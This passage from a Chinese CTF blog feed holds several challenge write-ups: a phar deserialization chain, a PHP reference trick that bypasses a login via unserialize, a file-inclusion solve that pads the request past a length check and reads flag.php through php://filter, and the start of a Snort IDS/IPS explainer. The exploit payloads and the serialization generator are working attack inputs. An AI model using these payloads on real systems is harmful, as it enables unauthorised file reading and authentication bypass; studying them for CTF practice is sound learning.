class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="comment">// value 是最后的文件执行的命令的结果 </span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是我们的思路就是利用 User 的去调用 Filelist的___call 把我们的Filelist中的file换成File类的对象去执行close方法。然后保存在result中，最后在离开的时候去回显出来。</p><p>完整的链子。</p><h5 id="触发phar"><a href="#触发phar" class="headerlink" title="触发phar"></a>触发phar</h5><h6 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h6><p>phar 链子搭建好了只是完成了第一步，首先我们需要上传一个phar文件。这个phar文件生成的时候需要.phar 后缀但是上传之后随便后缀就可以。</p><h6 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h6><p>首先，利用phar协议[[php反序列化#phar触发点]]  我们可以有两个地方可以触发phar协议 </p><p><strong>download.php</strong></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241214203208.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241214203254.png" alt="image.png"></p><p>都可以触发，但是不能用因为open_basedir 规定了不能读取根目录。所以flag读取不到。<br><strong>delete.php</strong></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241214203348.png" alt="image.png"><br>很幸运，delete.php 并没有相关操作。 因此可以用delete.php触发。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241214203432.png" alt="image.png"><br>上传然后抓包 删除修改filename 成功触发序列化</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241214203457.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_header</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$headers</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$k</span>,<span class="string">&#x27;HTTP_&#x27;</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^HTTP/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>));</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/_\w/&#x27;</span>,<span class="string">&#x27;header_callback&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^_/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="variable">$k</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="variable">$k</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;Host&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="variable">$headers</span>[]=<span class="string">&quot;<span class="subst">$k</span>:<span class="subst">$v</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">header_callback</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseHeader</span>(<span class="params"><span class="variable">$sResponse</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>)=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$sResponse</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable">$ret</span>=<span class="keyword">array</span>(<span class="variable">$headerstr</span>,<span class="variable">$sResponse</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="variable">$sResponse</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="title function_ invoke__">parseHeader</span>(<span class="variable">$sResponse</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">120</span>);</span><br><span class="line"><span class="variable">$headers</span>=<span class="title function_ invoke__">get_client_header</span>();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">63515</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> = <span class="variable">$method</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$url</span>.<span class="string">&quot; HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: &quot;</span>.<span class="variable">$host</span>.<span class="string">&quot;:&quot;</span>.<span class="variable">$port</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Content-Type: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Content-length:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> .= <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>);</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;&quot;</span>.<span class="variable">$post_data</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure><h4 id="hubuctfweb3"><a href="#hubuctfweb3" class="headerlink" title="hubuctfweb3"></a>hubuctfweb3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hubu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token= <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hubu&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了引用的功能，将两个属性使用引用，我们可以利用变量引用机制将两个变量地址引用相同，从而达到两个值无论怎么变化始终相等。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;GZCTF_FLAG&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hubu</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token= &amp;<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hubu</span>();  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h4 id="陇剑杯-2021-内存分析（问1）"><a href="#陇剑杯-2021-内存分析（问1）" class="headerlink" title="[陇剑杯 2021]内存分析（问1）"></a>[陇剑杯 2021]内存分析（问1）</h4><p>直接权证打开，找到密码文件然后找到密码。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹏城杯2024-训练</title>
      <link href="/2024/12/19/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024-%E8%AE%AD%E7%BB%83/"/>
      <url>/2024/12/19/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024-%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="what-is-log"><a href="#what-is-log" class="headerlink" title="what_is_log"></a>what_is_log</h5><p>scap 是sysdig 监控的工具，可以使用wireshark 打开scap 文件发现了很多事件，应该就是一些事件的流量监控。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108165010.png" alt="image.png"><br>导出write 流量，并且过滤39长度的包，找到85长度的包有一个success 后面的hash就是flag</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241108165110.png" alt="image.png"></p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="简单文件包含"><a href="#简单文件包含" class="headerlink" title="简单文件包含"></a>简单文件包含</h5><p>直接就是 文件包含但是过滤了什么于是直接读取index.php ，找到过滤点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="keyword">__FILE__</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;);&lt;br /&gt;<span class="keyword">include</span>(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #DD0000&quot;</span>&gt;<span class="string">&quot;flag&quot;</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #FF8000&quot;</span>&gt;<span class="comment">//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;&lt;br /&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只是禁了flag同时有一个检测800，只要大于八百那么flag就不会检测。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=0123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h4 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h4><p> txy{uwwospnropsprtssuurtvrttsvtqurpvsrxutzww}</p><h4 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算 </span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>snort-ips</title>
      <link href="/2024/12/09/snort-ips/"/>
      <url>/2024/12/09/snort-ips/</url>
      
        <content type="html"><![CDATA[<p><strong>Snort</strong> 是一个开源的网络入侵检测系统（IDS）和网络入侵防御系统（IPS），用于检测和防御各种网络攻击。它由 <strong>Martin Roesch</strong> 于1998年开发，并且广泛应用于网络安全领域。Snort 可以实时监控网络流量并分析数据包，以检测潜在的恶意活动。</p><h4 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h4><ol><li><p><strong>协议分析</strong>：Snort 可以分析多种网络协议，如 TCP&#x2F;IP、UDP、HTTP、FTP 等，识别异常的通信行为。</p></li><li><p><strong>规则集</strong>：Snort 使用规则集来定义检测和防御策略。用户可以根据需求定制规则，或者使用由 Snort 社区和其他安全专家提供的标准规则。</p></li><li><p><strong>流量捕获与包分析</strong>：Snort 可以在不同的网络接口上捕获数据包并对其进行深度分析。它不仅可以检查头部信息，还能够查看包体内容。</p></li><li><p><strong>实时检测与记录</strong>：Snort 在运行时可以实时分析流量，并将发现的可疑活动记录到日志中，提供详细的攻击信息。</p></li><li><p><strong>灵活性和可扩展性</strong>：Snort 提供了高度的灵活性，支持插件扩展、脚本编写、与其他安全工具（如防火墙、日志分析工具等）集成。</p></li><li><p><strong>防御模式（IPS）</strong>：Snort 除了可以作为入侵检测系统使用，还可以作为入侵防御系统，在发现攻击时采取主动的阻断措施，如丢弃恶意流量或重置连接。</p></li></ol><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>Snort 主要依赖于规则来分析网络流量，基于这些规则判断是否存在可疑或恶意行为。规则可以定义攻击特征、数据包大小、通信模式等内容。Snort 支持三种工作模式：</p><ol><li><strong>监控模式（Sniffer Mode）</strong>：仅捕获和显示网络流量，不进行任何分析和报警。</li><li><strong>入侵检测模式（IDS）</strong>：对流量进行深度分析，发现并报告潜在的攻击。</li><li><strong>入侵防御模式（IPS）</strong>：在检测到攻击时，除了报警外，还能采取主动的防御措施，如丢弃攻击数据包或重置连接。</li></ol><h4 id="Snort-规则"><a href="#Snort-规则" class="headerlink" title="Snort 规则"></a>Snort 规则</h4><p>Snort 使用规则集来定义检测逻辑，规则通常由以下几个部分组成：</p><ul><li><strong>动作</strong>：例如 <code>alert</code>（报警）、<code>drop</code>（丢弃数据包）等。</li><li><strong>协议</strong>：如 <code>TCP</code>、<code>UDP</code>、<code>ICMP</code> 等。</li><li><strong>源和目的地址</strong>：如源IP地址、目标IP地址。</li><li><strong>端口</strong>：源端口、目标端口。</li><li><strong>内容</strong>：用于匹配数据包内容的字符串模式。</li><li><strong>选项</strong>：一些特定的参数，用于进一步定义规则（如流量大小、TTL 值等）。</li></ul><h4 id="ips-和ids-模式"><a href="#ips-和ids-模式" class="headerlink" title="ips 和ids 模式"></a>ips 和ids 模式</h4><p><strong>1. 启动模式配置</strong></p><p>在 Snort 的配置文件（<code>snort.conf</code>）中，设置 Snort 